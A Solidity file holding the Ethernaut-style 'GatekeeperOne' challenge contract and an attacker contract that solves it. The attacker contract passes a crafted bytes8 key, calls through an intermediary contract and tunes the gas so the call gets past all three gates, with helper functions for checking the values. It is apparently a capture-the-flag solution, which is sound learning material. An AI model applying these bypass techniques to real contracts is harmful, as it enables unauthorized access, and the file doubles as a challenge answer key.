pragma solidity ^0.4.18;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(msg.gas % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint32(_gateKey) == uint16(_gateKey));
    require(uint32(_gateKey) != uint64(_gateKey));
    require(uint32(_gateKey) == uint16(tx.origin));
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract HackEnter {

    address toHackAddress = 0x330ab742585581e6edc3fcf2af0411f2374df4c4;
    
    // 0x10000066aF
    // 0xca35b7d915458ef540ade6068dfe2f44e8fa733c
    function hackEnter(){
        bytes8 inp = 0x10000066aF;
        GatekeeperOne one = GatekeeperOne(toHackAddress);
        one.enter.gas(82125)(inp);
    }

    function out1() public view returns (uint32){
        bytes8 inp = 0x10000066aF;
        return uint32(inp);
    }
    
    function out2() public view returns (uint16){
        bytes8 inp = 0x10000066aF;
        return uint16(inp);
    }

    function out3() public view returns (uint64){
        bytes8 inp = 0x10000066aF;
        return uint64(inp);
    }
    
    function out4() public view returns (uint16){
        return uint16(tx.origin);
    }
    
    function out5() public view returns (address){
        return tx.origin;
    }

    function check1() public {
        bytes8 inp = 0x10000066aF;
        require(uint32(inp) == uint16(inp));
    }
    function check2() public {
         bytes8 inp = 0x10000066aF;
       require(uint32(inp) != uint64(inp));
    }
 
    function check3() public {
        bytes8 inp = 0x10000066aF;
        require(uint32(inp) == uint16(tx.origin));
    }
    
    function check4() public {
        require(msg.gas % 8191 == 0);
    }
}